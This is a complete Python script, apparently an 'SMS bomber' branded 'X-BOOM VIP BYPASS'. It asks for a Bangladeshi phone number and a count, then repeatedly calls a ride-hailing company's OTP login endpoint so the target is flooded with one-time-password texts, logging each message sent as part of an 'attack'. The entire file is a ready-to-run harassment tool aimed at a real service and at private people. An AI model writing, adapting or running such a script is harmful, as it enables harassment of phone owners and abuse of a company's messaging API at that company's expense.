import requests
import os
import time

def banner():
    os.system('clear')
    print("========================================")
    print("        X-BOOM VIP BYPASS (2026)        ")
    print("========================================")

def send_sms(target, count):
    url = "https://api-hermes.pathao.com/user/otp-send/login"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/json"
    }
    phone = "+88" + target
    print(f"\n[+] Attack started on: {target}")
    for i in range(count):
        try:
            res = requests.post(url, json={"phone": phone}, headers=headers)
            if res.status_code == 200 or res.status_code == 201:
                print(f"[!] SMS {i+1} Sent Successfully!")
            else:
                print(f"[?] SMS {i+1} Failed - Code: {res.status_code}")
        except:
            print(f"[-] Error at SMS {i+1}")
        time.sleep(8)

def main():
    banner()
    number = input("Enter Phone (01xxxxxxxxx): ")
    amount = int(input("Amount: "))
    send_sms(number, amount)

if __name__ == "__main__":
    main()


  


